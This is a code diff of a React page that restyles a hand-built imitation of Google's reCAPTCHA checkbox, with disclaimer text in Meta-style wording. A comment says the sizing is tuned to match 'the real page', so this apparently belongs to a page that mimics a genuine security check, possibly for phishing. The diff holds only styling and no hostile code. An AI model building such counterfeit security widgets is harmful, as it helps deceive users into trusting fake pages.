@@ -712,17 +712,17 @@ export default function Home() {
           <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
             <div style={{ width: '100%', maxWidth: '700px' }}>
 
-                                                                     {/* BƯỚC 3: CAPTCHA FULL PAGE - Đã tách riêng để nhỏ lại */}
+                                                                                   {/* BƯỚC 3: CAPTCHA FULL PAGE - Chuẩn tỷ lệ */}
               {step === 3 && (
                 <div style={{ 
                   width: '100%', 
                   display: 'flex', 
-                  justifyContent: 'center', // Căn giữa khung nhỏ
-                  marginTop: '40px' // Đẩy xuống một chút cho cân
+                  justifyContent: 'center', 
+                  marginTop: '40px' 
                 }}>
                   
-                  {/* Khung bọc riêng cho Captcha (chỉ 400px) */}
-                  <div style={{ width: '100%', maxWidth: '250px' }}>
+                  {/* Bọc ngoài: Rộng 350px là vừa đẹp như trang thật */}
+                  <div style={{ width: '100%', maxWidth: '350px' }}>
                     
                     {/* Khung reCAPTCHA */}
                     <div 
@@ -730,7 +730,7 @@ export default function Home() {
                       style={{
                         border: '1px solid #d3d3d3',
                         borderRadius: '3px',
-                        padding: '20px 12px',
+                        padding: '24px 12px',
                         display: 'flex',
                         alignItems: 'center',
                         justifyContent: 'space-between',
@@ -742,7 +742,7 @@ export default function Home() {
                         userSelect: 'none'
                       }}
                     >
-                      <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                         {/* Checkbox */}
                         <div style={{
                           width: '24px', height: '24px', border: '2px solid #c1c1c1',
@@ -761,17 +761,17 @@ export default function Home() {
                       {/* Logo reCAPTCHA */}
                       <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
                         <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
-                        <span style={{ fontSize: '10px', color: '#555' }}>reCAPTCHA</span>
+                        <span style={{ fontSize: '9px', color: '#555' }}>reCAPTCHA</span>
                         <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
                       </div>
                     </div>
 
-                    {/* Text mô tả bên dưới */}
-                    <div style={{ marginTop: '12px', fontSize: '3px', color: '#555', lineHeight: '1.', textAlign: 'left', width: '100%' }}>
-                      <p style={{ margin: '0 0 8px 0' }}>
+                    {/* Khối chữ mô tả - Đã nới rộng và thu nhỏ font */}
+                    <div style={{ marginTop: '16px', fontSize: '12px', color: '#555', lineHeight: '1.5', textAlign: 'left', width: '100%' }}>
+                      <p style={{ margin: '0 0 12px 0' }}>
                         This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
                       </p>
-                      <p style={{ margin: '0 0 8px 0' }}>
+                      <p style={{ margin: '0 0 12px 0' }}>
                         We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
                       </p>
                       <p style={{ margin: 0 }}>
